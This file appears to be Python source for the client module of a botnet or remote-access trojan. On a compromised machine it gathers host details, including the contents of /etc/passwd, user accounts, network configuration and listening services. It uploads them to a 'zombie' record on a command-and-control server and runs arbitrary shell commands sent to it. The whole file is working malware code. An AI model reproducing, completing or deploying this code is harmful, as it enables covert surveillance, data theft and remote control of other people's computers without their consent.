#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n

import socket, platform, os, json
from subprocess import STDOUT, check_output, CalledProcessError

from app.components import logger, config
from app.modules import http_client


class Machine:
    def __init__(self):
        self.output = None
        self.cwd = config.APP_DIR
        self.info = {
            'current_user': '',
            'human_users': '',
            'users_online': '',
            'all_users': '',
            'private_ip': '',
            'public_ip': '',
            'country': '',
            'hostname': '',
            'os': '',
            'os_details': '',
            'arch': '',
            'manufacturer': '',
            'model': '',
            'cpu': '',
            'n_processors': '',
            'memory': '',
            'drives_usage': '',
            'netconfig': '',
            'svc_listen': '',
            'chipset_pci_bus': ''
        }

    def get_private_ip(self):
        temp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            temp_socket.connect(('10.255.255.255', 0))
            self.info['private_ip'] = temp_socket.getsockname()[0]
            return self.info['private_ip']
        except:
            self.info['private_ip'] = '127.0.0.1'
            return False
        finally:
            temp_socket.close()

    def get_public_ip_cc(self):
        try:
            data = http_client.post_json('https://api.myip.com/')
            if data:
                self.info['public_ip'] = data['ip']
                #self.info['public_ip'] = "8.8.8.8"      # testing purposes
                self.info['country'] = data['cc']
                return self.info['public_ip'], self.info['country']
            return False
        except:
            return False

    def get_hostname(self):
        # return os.uname()[1]
        # still need to test which works on windows
        # ...
        #return socket.gethostname()
        try:
            self.info['hostname'] = platform.node()
            if self.info['hostname']:
                return self.info['hostname']
        except:
            return False

    def get_current_user(self):
        try:
            if platform.system() == 'Windows':
                self.info['current_user'] = os.getlogin()
            elif platform.system() == 'Linux':
                import pwd
                self.info['current_user'] = pwd.getpwuid(os.getuid()).pw_name
            if self.info['current_user']:
                return self.info['current_user']
        except:
            return False

    def refresh_public_net_info(self):
        self.get_public_ip_cc()

    def refresh_local_net_info(self):
        self.get_hostname()
        self.get_private_ip()
        self.get_current_user()

    def refresh_system_info(self):
        self.get_system_info()
        #self.get_detailed_hw_info()

    def get_detailed_hw_info(self):
        # windows data
        if platform.system() == 'Windows':
            import wmi
            c = wmi.WMI()
            my_system = c.Win32_ComputerSystem()[0]
            # ...
            # ...s

        # linux data
        if platform.system() == 'Linux':
            self.info['detailed_hw'] = self.execute_comand("hwinfo")

    def get_system_info(self):

        self.info['os_details'] = platform.platform()

        # windows data
        if platform.system() == 'Windows':
            import wmi
            c = wmi.WMI()
            my_system = c.Win32_ComputerSystem()[0]
            self.info['os'] = 'windows'
            self.info["arch"] = my_system.SystemType
            self.info['manufacturer'] = my_system.Manufacturer
            self.info['model'] = my_system.Model
            self.info['memory'] = self.execute_comand("wmic MemoryChip get BankLabel, Capacity, MemoryType, TypeDetail, Speed")
            self.info['cpu'] = self.execute_comand("wmic CPU get NAME").strip("Name , ,")
            self.info["n_processors"] = str(my_system.NumberOfProcessors)
            self.info["drives_usage"] = self.execute_comand("wmic logicaldisk get size, freespace, caption")
            self.info["netconfig"] = self.execute_comand("ipconfig /all")
            self.info["svc_listen"] = self.execute_comand("netstat -ao")
            #self.info["tracert_to_cc"] = self.execute_comand("tracert {}".format(config.credentials["cc_url"].split("http://")[0].split("https://")[0]).split(":")[0].split("/")[0])

        # android data
        elif platform.system() == "Linux":
            from os import environ
            if 'ANDROID_STORAGE' in environ:
                self.info['os'] = 'android'

        # linux data
            else:
                self.info['os'] = 'linux'
                self.info['arch'] = self.execute_comand("uname -m")
                self.info['manufacturer'] = self.execute_comand("cat /sys/class/dmi/id/board_vendor")
                self.info['model'] = self.execute_comand("cat /sys/class/dmi/id/product_name")
                self.info['memory'] = self.execute_comand("free -h --si")
                self.info['cpu'] = self.execute_comand("grep '^model name' /proc/cpuinfo | cut -d':' -f2 | uniq")
                self.info['n_processors'] = self.execute_comand("grep -c ^processor /proc/cpuinfo")
                self.info["drives_usage"] = self.execute_comand("df -h")
                self.info["human_users"] = self.execute_comand("cut -d: -f1,3 /etc/passwd | egrep ':[0-9]{4}$' | cut -d: -f1")
                self.info["users_online"] = self.execute_comand("who")
                self.info["all_users"] = self.execute_comand("cat /etc/passwd")
                self.info["netconfig"] = self.execute_comand("ip addr")
                self.info["svc_listen"] = self.execute_comand("ss -tlnp")
                #self.info["tracert_to_cc"] = self.execute_comand("traceroute {}".format(config.credentials["cc_url"].split("http://")[0].split("https://")[0]).split(":")[0].split("/")[0])
                self.info['chipset_pci_bus'] = self.execute_comand("lspci")

        # ios data
        elif platform.system() == "Darwin":
            self.info['os'] = 'ios'

    def upload_system_info(self):
        from app.components import token
        from app.modules import crud
        data = {
            "jwt": token.jwt,
            "sysinfo": json.dumps(self.info)  # ,
            # 'os_details': machine.info['os_details']  # still need to think a smart way to store and represent nested info
        }

        logger.log('trying to update OS info', 'DEBUG')
        try:
            if crud.update_data('zombie', data):
                logger.log('OS info updated', 'SUCCESS')
                return True
        except Exception as e:
            logger.log(e, 'ERROR')
            logger.log('error trying to update OS info', 'ERROR')
            return False

    def startup_tasks(self):
        # refresh os info only one time per session
        logger.log('executing startup tasks...', 'OTHER')
        if self.upload_system_info():
            return True

    def autorecon(self):
        logger.log('starting autorecon module...', 'OTHER')
        self.refresh_local_net_info()
        self.refresh_public_net_info()
        self.refresh_system_info()

    def change_dir(self, new_path):
        new_path = os.path.expandvars(new_path)
        if os.path.exists(new_path):
            os.chdir(new_path)
            self.cwd = os.getcwd()
            logger.log('session current working dir changed to {}'.format(os.getcwd()), 'DEBUG')
            return True
        return False

    def execute_comand(self, command, timeout=50):
        try:
            # before every command, change dir to current working directory
            self.change_dir(self.cwd)
            logger.log('change dir to session current working dir ({})'.format(os.getcwd()), 'DEBUG')

            # change current working dir if requested
            if command.startswith('cd'):
                command = (command.split())
                if len(command) == 2:
                    if self.change_dir(command[1]):
                        self.output = os.getcwd()

            # execute command
            else:
                self.output = check_output(command, stderr=STDOUT, timeout=timeout, shell=True, universal_newlines=True)
                # if self.output:
                #     try:
                #         self.output = self.output.decode("utf-8")
                # else:
                #     self.output = ' '
                if not self.output:
                    self.output = ' '

            #after every command, change dir to app base directory
            os.chdir(config.APP_DIR)
            logger.log('returned back to app dir ({})'.format(os.getcwd()), 'DEBUG')

            #return self.output
            return self.output

        except CalledProcessError as e:
            try:
                return e.output.decode("utf-8")
            except:
                try:
                    return e.output
                except:
                    logger.log("type: {}, value: {}".format(type(self.output), self.output), 'ERROR')
                    pass
                    #self.output = self.output.decode("ascii")
